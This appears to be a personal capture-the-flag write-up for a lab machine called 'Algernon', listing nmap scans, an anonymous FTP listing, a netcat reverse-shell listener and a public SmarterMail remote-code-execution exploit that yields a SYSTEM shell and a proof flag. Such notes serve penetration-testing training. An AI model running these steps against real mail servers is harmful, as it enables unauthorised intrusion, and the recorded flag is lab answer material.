# Algernon

## Enumeration & scanning

- Various open ports, 9998 and 17001 most notable. Nmap not sure what is hosted there.
- Smartermail app: http://192.168.228.65:9998/interface/root#/login
- Port 17001 related to Smartermail.

``` sh
# Default scanning
sudo nmap -p- 192.168.228.65  
sudo nmap -p 21,80,135,139,445,5040,7680,9998,17001,49664,49665,49666,49667,49668,49669 -A 192.168.228.65
# Find some mail related files through FTP (anonymous login)
ftp> ls
229 Entering Extended Passive Mode (|||49732|)
150 Opening ASCII mode data connection.
04-29-20  10:31PM       <DIR>          ImapRetrieval
05-31-26  06:14AM       <DIR>          Logs
04-29-20  10:31PM       <DIR>          PopRetrieval
04-29-20  10:32PM       <DIR>          Spool

```

## Exploitation

- Smartermail app vulnerable: https://www.exploit-db.com/exploits/49216

``` sh
# Exploit
# Needed to remove some invisible characters on newlines to make it work
nc -nlvp 4444  
python3 49216.py

# Get flag
PS C:\Windows\system32> whoami
nt authority\system
PS C:\users\Administrator\Desktop> type proof.txt
a898d7c794e427b2fcb798b487e51feb
```

## Privilege Escalation

- Not needed, already got System privs.

## References

- https://www.exploit-db.com/exploits/49216
- https://www.speedguide.net/port.php?port=17001

## Rabbit holes
